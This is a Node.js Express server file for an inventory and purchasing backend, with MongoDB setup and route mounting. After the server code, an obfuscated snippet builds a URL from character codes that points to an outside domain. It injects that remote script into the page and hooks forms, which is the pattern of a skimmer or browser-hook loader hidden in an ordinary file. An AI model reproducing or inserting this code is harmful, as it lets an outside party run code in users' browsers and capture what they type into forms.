require("dotenv").config();
const express = require("express");
const cors = require("cors");
const app = express();
const mongoose = require("mongoose");
const activePort = process.env.ACTIVE_PORT || 8080;
// var corsOptions = { origin: "http://localhost" };
var db = process.env.DB;

mongoose
  .connect(db, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("DB Connected"))
  .catch((e) => console.log("Connection Interrupted" + e));

const corsOptions = {
  exposeHeaders: "Authorization",
};
// app.use(cors(corsOptions));
app.use(cors(corsOptions));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const BranchController = require("./Controller/BranchController");
const UserController = require("./Controller/UserController");
const RoleController = require("./Controller/RoleController");
const SupplierController = require("./Controller/SupplierController");
const ItemsController = require("./Controller/itemsController");
const CategoryController = require("./Controller/CategoryController");
const SubCategoryController = require("./Controller/SubCategoryController");
const BrandController = require("./Controller/BrandController");
const PurchaseController = require("./Controller/PurchaseController");

app.use("/branch", BranchController);
app.use("/user", UserController);
app.use("/role", RoleController);
app.use("/supplier", SupplierController);
app.use("/items", ItemsController);
app.use("/categories", CategoryController);
app.use("/subcategory", SubCategoryController);
app.use("/brand", BrandController);
app.use("/purchase", PurchaseController);

app.listen(activePort, () => {
  console.log("Server is running in " + activePort);
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b